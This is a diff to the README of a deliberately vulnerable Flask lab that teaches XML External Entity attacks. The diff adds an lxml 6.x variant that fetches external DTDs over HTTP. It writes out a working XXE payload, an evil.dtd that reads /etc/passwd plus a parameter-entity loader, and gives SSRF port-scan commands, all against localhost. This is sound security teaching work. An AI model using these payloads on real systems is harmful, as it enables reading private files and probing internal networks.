@@ -31,6 +31,7 @@ This project demonstrates **XML External Entity (XXE)** vulnerabilities through:
 xxe-security-demo/
 ├── vulnerable_app/          # Intentionally vulnerable Flask application
 │   ├── app.py              # Main vulnerable app (port 5000)
+│   ├── app_urllib.py       # Same app + urllib resolver for lxml 6.x HTTP DTDs (see below)
 │   ├── uploads/            # Uploaded XML files
 │   └── sensitive_data.txt  # Demo sensitive file
 │
@@ -107,10 +108,12 @@ source .venv/bin/activate  # On Windows: .venv\Scripts\activate
 pip install -r requirements.txt
 ```
 
-**Dependencies:**
-- Flask 3.0.0
-- lxml 5.3.0
-- requests 2.32.3
+**Errata corrigé:** The dependency versions below were wrong in earlier revisions (they listed `lxml` 5.3.0, etc.). They are now aligned with the pinned versions in `requirements.txt`.
+
+**Dependencies (see `requirements.txt` for the full lockfile):**
+- Flask 3.1.2
+- lxml 6.0.2
+- requests 2.32.5
 
 ---
 
@@ -123,6 +126,8 @@ python app.py
 ```
 
 **Access at:** http://127.0.0.1:5000
+
+To run the alternative app that fetches **HTTP/HTTPS** DTD URLs via Python (for **lxml 6.x** on typical binary wheels), use `python app_urllib.py` in the same directory (same port; see [app_urllib and lxml 6.x](#app-urllib-lab)).
 
 ### 2. Start Secure Application (Optional)
 ```bash
@@ -196,7 +201,53 @@ python exploits/ssrf_attack.py -t http://127.0.0.1:5000 --scan 127.0.0.1 --ports
 python exploits/ssrf_attack.py -t http://127.0.0.1:5000 -u http://127.0.0.1:5000/health -v
 ```
 
-**Note:** Modern lxml blocks HTTP in external entities, so SSRF attacks are limited. This demonstrates good security practices!
+**Note:** On many current **lxml 6.x** binary wheels, libxml2 no longer offers direct HTTP/FTP for URL parsing, so “pure libxml” HTTP entity resolution behaves differently than older builds. For a lab that still exercises **HTTP-fetched DTDs** in-process, use [`vulnerable_app/app_urllib.py`](vulnerable_app/app_urllib.py) and the [dedicated section](#app-urllib-lab). Unrelated file-based XXE demos work with `app.py` as before.
+
+---
+
+<a id="app-urllib-lab"></a>
+## `app_urllib.py` and lxml 6.x (HTTP via Python)
+
+Starting with [lxml 6.0.0](https://github.com/lxml/lxml/releases) (e.g. binary wheels using **libxml2 2.14.4** and **libxslt 1.1.43**), release notes state:
+
+- *"Binary wheels use the library versions libxml2 2.14.4 and libxslt 1.1.43. **Note that this disables direct HTTP and FTP support for parsing from URLs.** **Use Python URL request tools instead (which usually also support HTTPS).** To test the availability, use ``"http" in etree.LIBXML_FEATURES``."*
+
+`vulnerable_app/app_urllib.py` is the same vulnerable Flask demo as `app.py`, but registers a custom **`lxml` `HttpUrlResolver`** that loads `http://` and `https://` resources with **`urllib`**, with a default **localhost-only** allowlist (`ALLOWED_RESOLVER_HOSTS`). That matches the upstream recommendation: when `"http" not in etree.LIBXML_FEATURES`, you can still perform resolver-driven fetches in Python for educational SSRF/DTD demos.
+
+**Important:** With the usual **lxml from Python** workflow here, you are still looking at **inline / in-band** effects (entity text ends up in the parsed tree and the app’s response). This lab is **not** set up to demonstrate **out-of-band (OOB)** exfiltration to a remote colluding server; OOB is a different scenario (firewalls, blind channels, etc.).
+
+**Run the app**
+
+```bash
+cd vulnerable_app
+python app_urllib.py
+# optional: check whether libxml exposes HTTP
+python -c "from lxml import etree; print('http' in etree.LIBXML_FEATURES)"
+```
+
+**Serve the external DTD** (example on port 9000). Create a file `evil.dtd` in the directory you will serve:
+
+```dtd
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+```
+
+```bash
+cd /path/where/evil/dtd/lives
+python -m http.server 9000
+```
+
+**In-band parameter-entity + external DTD payload** (paste into the app, or POST to `/api/parse`):
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % remote SYSTEM "http://localhost:9000/evil.dtd">
+  %remote;
+]>
+<data>&xxe;</data>
+```
+
+The expanded `&xxe;` value appears in the parsed output when entities are resolved. Adjust host or port to match your HTTP server; keep the resolver allowlist in `app_urllib.py` consistent with the URL you use (default: `127.0.0.1`, `localhost`, `::1`).
 
 ---
 
